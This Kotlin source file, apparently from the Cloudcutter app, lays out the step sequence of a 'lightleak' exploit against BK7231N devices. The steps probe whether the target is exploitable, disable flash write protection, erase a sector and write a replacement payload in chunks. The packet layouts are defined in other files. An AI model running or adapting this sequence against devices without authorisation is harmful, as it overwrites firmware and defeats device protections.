/*
 * Copyright (c) Kuba Szczodrzyński 2022-11-1.
 */

package io.github.cloudcutter.work

import io.github.cloudcutter.R
import io.github.cloudcutter.data.model.ProfileLightleakDataN
import io.github.cloudcutter.ext.roundTo
import io.github.cloudcutter.util.MessageType
import io.github.cloudcutter.util.Text
import io.github.cloudcutter.work.action.Action
import io.github.cloudcutter.work.action.MessageAction
import io.github.cloudcutter.work.action.PacketAction
import io.github.cloudcutter.work.action.PingAction
import io.github.cloudcutter.work.protocol.buildByteArray
import io.github.cloudcutter.work.protocol.proper.FillIntfPacket
import io.github.cloudcutter.work.protocol.proper.StopTimerPacket
import io.github.cloudcutter.work.protocol.stager.bk7231n.CallbackPacket
import io.github.cloudcutter.work.protocol.stager.bk7231n.DDevCommand
import io.github.cloudcutter.work.protocol.stager.bk7231n.DDevControlPacket
import io.github.cloudcutter.work.protocol.stager.bk7231n.DDevOpenPacket
import io.github.cloudcutter.work.protocol.stager.bk7231n.DDevWritePacket
import io.github.cloudcutter.work.protocol.toOffset

class ActionGraphLightleakN(
	private val work: WorkData,
	private val profile: ProfileLightleakDataN,
) {

	fun getActions(): Array<Action> = listOf(
		PacketAction(
			id = "exploit_check",
			title = Text(R.string.action_packet_stager_callback),
			nextId = "ping_found_3",
			packet = CallbackPacket(
				profile = profile,
			),
		),
		PingAction(
			id = "ping_found_3",
			title = Text(R.string.action_ping_exploitable),
			nextId = "message_exploitable",
			mode = PingAction.Mode.FOUND,
			address = work.targetAddress,
		),
		MessageAction(
			id = "message_exploitable",
			type = MessageType.SUCCESS,
			text = Text(R.string.message_exploitable),
			nextId = "ddev_open",
		),
		PacketAction(
			id = "ddev_open",
			title = Text(R.string.action_packet_stager_flash_open),
			nextId = "ddev_control",
			packet = DDevOpenPacket(
				profile = profile,
				name = "flash",
			),
		),
		PacketAction(
			id = "ddev_control",
			title = Text(R.string.action_packet_stager_flash_unprotect),
			nextId = "ping_found_4",
			packet = DDevControlPacket(
				profile = profile,
				command = DDevCommand.FLASH_SET_PROTECT,
				param = buildByteArray(size = 4, 2),
			),
		),
		PingAction(
			id = "ping_found_4",
			title = Text(R.string.action_ping_respond),
			nextId = "fill_intf",
			mode = PingAction.Mode.FOUND,
			address = work.targetAddress,
		),
		PacketAction(
			id = "fill_intf",
			title = Text(R.string.action_packet_proper_fill_intf),
			nextId = "flash_erase",
			packet = FillIntfPacket(
				profile = profile,
				requestId = 0x1234,
			),
		),
		*getProperWriteActions(nextId = "proper_stop_timer"),
		PacketAction(
			id = "proper_stop_timer",
			title = Text(R.string.action_packet_stop_timer),
			nextId = "ping_found_5",
			packet = StopTimerPacket(
				profile = profile,
				requestId = 0x1234,
				timerPeriods = listOf(3 * 60 * 1000), // 180000 ms
			),
		),
	).toTypedArray()

	private fun getProperWriteActions(nextId: String?): Array<Action> {
		var offset = profile.getGadget("proper").address.roundTo(2).toOffset()
		val list = mutableListOf<Action>(
			PacketAction(
				id = "flash_erase",
				title = Text(R.string.action_packet_flash_erase, offset),
				nextId = "flash_write_0",
				packet = DDevControlPacket(
					profile = profile,
					command = DDevCommand.FLASH_ERASE_SECTOR,
					param = buildByteArray(size = 4, offset),
				),
			),
		)

		val chunked = work.lightleakProper.toList().chunked(128)
		for ((i, chunk) in chunked.withIndex()) {
			list += PacketAction(
				id = "flash_write_${i}",
				title = Text(R.string.action_packet_flash_write, chunk.size, offset),
				nextId = if (i == chunked.lastIndex) nextId else "flash_write_${i + 1}",
				packet = DDevWritePacket(
					profile = profile,
					data = chunk.toByteArray(),
					param = offset,
				),
			)
			offset += chunk.size
		}
		return list.toTypedArray()
	}
}
